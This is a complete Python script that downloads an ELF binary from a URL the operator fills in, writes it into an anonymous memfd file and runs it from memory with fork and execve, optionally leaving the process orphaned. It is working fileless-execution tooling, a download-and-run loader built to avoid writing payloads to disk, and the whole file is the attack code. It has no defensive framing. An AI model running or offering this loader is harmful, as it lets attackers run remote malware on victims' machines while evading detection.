#!/usr/bin/env python3

import os
from random import choice
from string import ascii_lowercase
from urllib import request,error

def createFd():
    print('[+] Creating anonymous fd')
    s = ''.join(choice(ascii_lowercase) for _ in range(7))

    fd = os.memfd_create(s,0)
    if fd == -1:
        print('[-] Error in creating fd')
        exit(0)
    return fd

def getFileFromUrl(url):
    print(f'[+] Downloading contents from {url}')
    try:
        r = request.urlopen(url)
        c = r.read()
        r.close()
        if r.msg != 'OK':
            print('[-] Error connecting to url')
            exit()
        return c
    except error.URLError as e:
        print(f'[-] Download error; {e.reason}')
        exit()

def writeToFile(fd,c):
    print('[+] Writing contents to anonymous file')
    with open(f'/proc/self/fd/{fd}','wb') as f:
        f.write(c)

def execAnonFile(fd,args,wait_for_proc_terminate):
    print('[+] Spawning process...')
    child_pid = os.fork()
    if child_pid == -1:
        print('[-] Error spawning new process')
        exit()
    elif child_pid == 0:
        print('[+] Executing...')
        fname = f'/proc/self/fd/{fd}'
        args.insert(0,fname)
        os.execve(fname,args,dict(os.environ))        
    else:
        if wait_for_proc_terminate:
            print(f'    Waiting for new process ({child_pid}) to terminate')
            os.waitpid(child_pid,0)
        else:
            print('   New process is now orphaned')

# MAIN CODE
url = '' # To download elf from; format: http://your-server/your_elf
args = [] # List of arguments to pass to program; format: ['arg1', 'arg2', ...], leave it empty for no arguments.
wait_for_proc_terminate = True # Wait for new spawned process to terminate

try:
    fd = createFd()
    contents = getFileFromUrl(url)
    writeToFile(fd,contents)
    execAnonFile(fd,args,wait_for_proc_terminate)
except KeyboardInterrupt:
    print('[-] User interrupted!')
